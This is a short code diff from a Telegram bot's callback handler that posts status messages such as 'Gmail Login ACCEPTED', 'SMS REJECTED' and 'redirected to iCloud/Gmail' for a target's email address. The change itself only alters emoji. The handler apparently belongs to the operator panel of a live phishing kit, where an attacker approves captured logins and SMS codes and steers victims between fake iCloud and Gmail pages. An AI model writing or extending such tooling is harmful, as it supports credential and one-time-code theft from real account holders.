@@ -316,9 +316,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "sms_reject") {
         statusMessage = `📱 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
       } else if (action === "redirect_icloud") {
-        statusMessage = `☁️ <code>${email}</code> redirected to <b>iCloud</b>! ✅`;
+        statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
-        statusMessage = `🌈 <code>${email}</code> redirected to <b>Gmail</b>! ✅`;
+        statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
       } else if (action === "gmail_accept") {
         statusMessage = `🌈 <code>${email}</code> Gmail Login <b>ACCEPTED</b>! ✅`;
         console.log(`✅ GMAIL_ACCEPT matched! Message: ${statusMessage}`);
